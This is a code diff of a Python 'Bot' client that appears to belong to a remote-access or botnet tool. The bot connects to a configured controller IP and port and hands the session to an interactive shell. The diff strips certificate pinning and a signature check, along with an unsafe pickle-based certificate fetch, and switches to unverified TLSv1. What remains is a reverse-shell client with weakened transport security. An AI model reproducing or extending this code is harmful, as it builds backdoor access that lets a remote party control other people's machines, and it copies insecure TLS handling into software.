@@ -28,13 +28,9 @@ if hasattr(sys, 'frozen'):
 IP = addr_ip 
 PORT = addr_port 
 
-# signature 
-signature = SIG
-
 class Bot(object):
  
  def __init__(self, home):
-  self.cert = 'public.crt' 
   self.shell = None
   self.home = home
   self.conn = None 
@@ -42,7 +38,7 @@ class Bot(object):
   self.ip = None
 
  def shutdown(self):
-  try:
+  try: 
    self.conn.shutdown(socket.SHUT_RDWR)
    self.conn.close()
   except:pass
@@ -50,10 +46,9 @@ class Bot(object):
  def connect(self):
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.settimeout(10)
-
-  self.conn = ssl.wrap_socket(sock, ca_certs=self.cert, cert_reqs=ssl.CERT_REQUIRED)
+  self.conn = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1) 
   s = session.Session(self.conn)
-  services = s.connect(self.ip, self.port, 2)
+  services = s.connect(self.ip, self.port)
   if not services:
    self.ip, self.port, self.is_active = None, None, False
    self.display_text('Error: Server is unavailable, trying again in a bit')
@@ -61,20 +56,6 @@ class Bot(object):
    self.shell = shell.Shell(s, services['args'], self.home)
    self.is_active = True
    self.shell.shell()
-
- def get_cert(self):
-  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s = session.Session(sock)
-  resp = s.connect(self.ip, self.port, 1)
-  if resp:
-   resp = pickle.loads(resp)
-   with open(self.cert, 'wb') as f:
-    self.port = resp['port']
-    self.ip = resp['ip']
-    f.write(resp['cert'])
-  s.shutdown() 
-  if resp:
-   return True 
 
  # -------- UI -------- #
 
@@ -84,9 +65,7 @@ class Bot(object):
  def contact_server(self, ip, port):
   self.ip, self.port = ip, int(port)
   try:
-   if self.get_cert():
-    sleep(1.5)
-    self.connect()
+   self.connect()
   except Exception as e:
    self.shutdown()
 
